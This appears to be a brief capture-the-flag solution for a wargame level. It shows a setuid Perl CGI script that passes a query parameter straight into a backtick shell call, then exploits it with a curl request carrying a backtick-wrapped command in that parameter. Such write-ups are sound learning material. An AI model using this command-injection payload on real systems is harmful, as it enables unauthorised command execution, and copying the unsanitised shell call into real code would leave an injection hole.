## Solutions

```console
~$ ls -l
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
Perl script file found! Owner is flag04  
Lets exploit it

```perl
#!/usr/bin/perl
# localhost:4747		
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```

```console
$~ curl localhost:4747/?x=\`getflag\`
```
